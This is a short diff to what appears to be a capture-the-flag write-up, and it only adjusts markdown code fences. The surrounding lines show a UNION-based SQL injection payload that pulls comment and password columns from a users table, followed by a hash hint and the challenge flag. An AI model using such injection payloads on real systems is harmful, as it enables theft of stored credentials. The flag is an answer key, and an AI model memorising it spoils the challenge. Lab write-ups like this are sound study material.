@@ -67,6 +67,7 @@ Surname : users```
 
 ````
 
+```
 ID: 1 UNION SELECT commentaire, countersign FROM users
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
@@ -77,7 +78,5 @@ Surname : 5ff9d0165b4f92b14994e5c685cdce28
 
 encode fortytwo with sh256
 FLAG: 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5
-
-```
 
 ```
